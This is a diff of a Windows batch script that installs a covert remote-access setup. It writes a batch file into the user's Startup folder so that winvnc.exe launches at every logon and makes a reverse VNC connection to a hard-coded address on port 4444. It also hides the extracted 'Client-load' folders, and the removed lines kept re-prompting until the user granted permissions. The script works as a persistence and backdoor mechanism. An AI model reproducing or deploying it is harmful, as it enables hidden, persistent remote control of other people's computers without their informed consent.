@@ -8,15 +8,19 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
   echo @echo off
   echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
   echo cd /d "%~dp0"
+  echo start /min "" winvnc.exe  REM Start winvnc.exe in minimized window
+  echo timeout /t 7 >nul  REM Wait for 7 seconds for user to allow permissions
   echo call "%~dp0run_winvnc.bat"
 ) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"
 
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
 (
   echo @echo off
-  echo start winvnc.exe -run
-  echo timeout /t 1 >nul
-  echo winvnc.exe -connect 192.168.1.39::4444
+  echo taskkill /im winvnc.exe /f >nul  REM Kill all instances of winvnc.exe
+  echo timeout /t 1 >nul  REM Wait 1 second after killing processes
+  echo start winvnc.exe -run  REM Start winvnc.exe with batch commands
+  echo timeout /t 1 >nul  REM Wait 1 second before connecting
+  echo winvnc.exe -connect 192.168.1.39::4444  REM Connect to the specified address
 ) > "%script_dir%run_winvnc.bat"
 
 REM Check if both batch files exist in their respective locations
@@ -35,49 +39,5 @@ if exist "%script_dir%run_winvnc.bat" (
 REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
-
-REM Start winvnc.exe to get permissions
-start "" winvnc.exe
-
-REM Wait for user to make a decision on the permissions prompt
-echo Waiting for user to allow permissions...
-timeout /t 10 >nul
-
-REM Check if winvnc.exe is running
-tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-if errorlevel 1 (
-  REM If process is not found, user denied permissions, retry
-  start "" winvnc.exe
-  goto :WaitForDecision
-)
-
-REM If process is found, wait for the user to grant permissions
-:CheckPermissions
-echo Checking permissions for winvnc.exe...
-timeout /t 2 >nul
-tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-if errorlevel 1 (
-  REM If winvnc.exe is not found, permissions were not granted, retry
-  goto :CheckPermissions
-) else (
-  REM If winvnc.exe is found, proceed
-  echo winvnc.exe has permissions. Proceeding...
-  taskkill /im winvnc.exe /f
-
-  REM Start winvnc.exe with batch commands
-  start /min "" winvnc.exe -run
-
-  REM Wait for winvnc.exe to start correctly with the batch commands (check every 2 seconds)
-  :CheckPermissionsBatch
-  echo Checking permissions for winvnc.exe with batch commands...
-  timeout /t 2 >nul
-  tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-  if errorlevel 1 (
-    goto :CheckPermissionsBatch
-  ) else (
-    echo winvnc.exe is running with batch commands. Starting run_winvnc.bat...
-    call "%script_dir%run_winvnc.bat"
-  )
-)
 
 REM End of main.bat
